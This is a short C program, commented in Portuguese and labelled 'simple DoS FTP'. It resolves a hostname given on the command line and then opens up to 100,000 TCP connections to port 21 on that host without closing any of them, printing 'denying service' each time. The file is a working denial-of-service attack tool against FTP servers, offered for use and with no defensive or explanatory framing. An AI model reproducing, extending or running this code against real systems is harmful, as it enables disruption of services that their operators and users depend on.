#include<stdio.h>
#include<netdb.h>
#include<arpa/inet.h>
#include<string.h>
#include<stdlib.h>

#define MAX 100000

/*#******************************
# simple DoS FTP  
*******************************/


char* resolver(char *host){
	int re;
	char *nome;
	struct addrinfo hints,*res;
	struct sockaddr_in *h;

	memset(&hints,0,sizeof(hints));	
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	re = getaddrinfo(host,NULL,&hints,&res);

	if(re != 0){
		fprintf(stderr,"getaddrinfo: %s\n",gai_strerror(re));
		exit(0);
	}

	h = (struct sockaddr_in *)res->ai_addr;
//	printf("%s ---> %s\n",host,inet_ntoa(h->sin_addr));
	nome = inet_ntoa(h->sin_addr);
	return nome;
}

void dos(char *n){
	int ms,con,p;
	struct sockaddr_in alvo;
	for(p=0;p<MAX;p++){
		ms = socket(AF_INET,SOCK_STREAM,0);
		memset(&alvo,0,sizeof alvo);
		alvo.sin_family = AF_INET;
		alvo.sin_port = htons(21);
		alvo.sin_addr.s_addr = inet_addr(n);
		con = connect(ms,(struct sockaddr *)&alvo,sizeof(alvo));
		printf("denying service\n");
	}
}

int main(int argc, char *argv[]){
	if(argc != 2){
		printf("modo de uso: %s host/ip\n",argv[0]);
		return 1;
	}
	
	char *ip;
	ip = argv[1];

	dos(resolver(ip));

	return 0;

}	
